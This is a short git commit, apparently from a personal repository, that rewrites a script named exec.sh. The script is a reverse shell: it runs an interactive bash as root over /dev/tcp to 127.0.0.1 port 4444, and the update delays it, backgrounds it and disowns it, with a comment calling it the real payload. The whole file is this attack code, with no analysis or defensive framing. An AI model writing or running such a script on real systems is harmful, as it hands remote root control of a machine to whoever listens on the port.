c571052625cf9a585da3e79489abece03e071299
Aryan Giri <227362547+giriaryan694-a11y@users.noreply.github.com>
2026-05-30 17:38:44 +0530

    Update exec.sh

--- exec.sh
+++ exec.sh
@@ -1,1 +1,4 @@
-sudo bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+#!/bin/bash
+# Non-interactive: just schedules the real payload
+(sleep 2; sudo bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1') &
+disown
